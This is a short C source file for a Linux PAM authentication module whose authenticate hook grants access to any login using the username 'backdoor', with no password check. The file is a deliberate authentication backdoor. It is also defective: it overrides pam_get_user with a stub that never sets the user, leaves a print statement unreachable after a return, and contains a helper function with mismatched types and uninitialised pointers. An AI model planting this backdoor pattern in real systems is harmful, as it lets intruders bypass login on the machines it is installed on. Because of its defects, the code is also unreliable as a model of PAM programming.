#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

const char* pUsername;
/* expected hook */
PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	printf("Acct mgmt\n");
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt){
	return PAM_SUCCESS;
}

/* expected hook, this is where custom stuff happens */
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
	int retval;
	retval = pam_get_user(pamh, &pUsername, "Username: ");
	printf("Welcome %s\n", pUsername);

	if (retval != PAM_SUCCESS) {
		return retval;
	}

	if (strcmp(pUsername, "backdoor") != 0) {
		return PAM_AUTH_ERR;
		printf("ACCESS DENIED");
	}
	printf("ACCESS GRANTED");

	return PAM_SUCCESS;
}
   int username_and_password(pam_handle_t *pamh, const char username, const char password){
  	pUsername = &username;
  	int retval;
  	const char** attempt;
  	retval = pam_sm_authenticate(pamh, 1, 1, attempt);

  	if (retval != PAM_SUCCESS){
  		printf("ACCESS DENIED.");
  		return 0;
  	}
  	printf("ACCESS GRANTED");
  	return 1;

  }
